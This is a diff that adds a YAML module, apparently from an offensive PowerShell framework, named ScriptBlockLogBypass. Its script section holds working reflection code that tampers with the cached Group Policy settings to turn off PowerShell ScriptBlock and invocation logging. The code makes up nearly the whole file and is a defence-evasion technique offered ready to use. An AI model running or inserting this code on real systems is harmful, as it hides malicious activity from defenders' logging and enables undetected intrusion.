@@ -1,0 +1,23 @@
+name: ScriptBlockLogBypass
+authors:
+  - name:
+    handle: '@Cobbr'
+    link:
+description: Disables PowerShell ScriptBlock logging through reflection
+comments:
+  - 'https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407'
+language: powershell
+min_language_version: '3'
+script: |
+  $GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
+  If ($GroupPolicyField) {
+      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
+      If ($GroupPolicyCache['ScriptBlockLogging']) {
+          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
+          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
+      }
+      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
+      $val.Add('EnableScriptBlockLogging', 0);
+      $val.Add('EnableScriptBlockInvocationLogging', 0);
+      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
+  };
